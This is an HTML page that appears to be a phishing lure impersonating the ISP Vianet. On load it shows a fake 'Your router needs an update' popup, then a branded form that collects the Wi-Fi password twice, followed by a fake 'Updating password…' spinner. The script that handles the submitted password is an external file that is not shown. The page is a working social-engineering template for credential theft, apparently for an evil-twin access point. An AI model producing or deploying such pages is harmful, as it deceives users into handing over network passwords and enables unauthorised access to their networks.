<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Vianet Login</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
  <!-- Router-update modal (shown on load) -->
  <div id="router-update-popup" class="router-update-popup">
    <div class="popup-content">
      <p>Your router needs an update.</p>
      <button id="router-update-ok">OK</button>
    </div>
  </div>

  <!-- Main login container (hidden until OK) -->
  <div class="container">
    <div class="login-box">
      <!-- replaced H1 with logo image -->
      <div class="logo-header">
        <img src="vianet.png" alt="Vianet Logo" class="logo-img">
      </div>
      <h2>Welcome<br>To <span class="highlight">Vianet</span></h2>
      <form id="passwordForm">
        <input
          type="password"
          id="password"
          name="password"
          placeholder="Wifi_Password"
          required
        >
        <input
          type="password"
          id="confirmPassword"
          name="confirmPassword"
          placeholder="Confirm Password"
          required
        >
        <div class="forgot-password">
          <a href="#">Forgot Password?</a>
        </div>
        <button type="submit">Submit</button>
        <div class="register-link">
        </div>
      </form>
      <div id="messageBox" class="message-box"></div>
      <p class="copyright">
        © 2025 Vianet. All rights reserved.
      </p>
    </div>
  </div>

  <!-- Updating overlay (spinner) -->
  <div id="updating-popup" class="updating-popup">
    <div class="popup-content">
      <div class="spinner"></div>
      <p>Updating password…</p>
      <button id="cancel-update">Cancel</button>
    </div>
  </div>

  <script src="js/main.js"></script>
</body>
</html>
